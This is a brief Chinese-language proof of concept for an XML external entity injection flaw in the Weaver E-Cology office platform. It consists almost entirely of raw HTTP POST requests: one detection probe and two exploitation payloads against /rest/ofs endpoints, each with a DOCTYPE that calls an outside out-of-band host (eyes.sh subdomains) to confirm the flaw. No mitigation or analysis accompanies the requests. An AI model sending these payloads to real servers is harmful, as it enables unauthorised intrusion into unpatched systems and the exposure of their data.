泛微E-Cology XML外部实体注入漏洞

检测

```
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host: 
Content-Type: application/xml

<M><syscode>666</syscode></M>
```

利用

接口一：
```
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Host: 
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://dns1.1.eyes.sh">
<M><syscode>&send;</syscode></M>
```

接口二:
```
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host: 
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://dns2.1.eyes.sh">
<M><syscode>&send;</syscode></M>
```
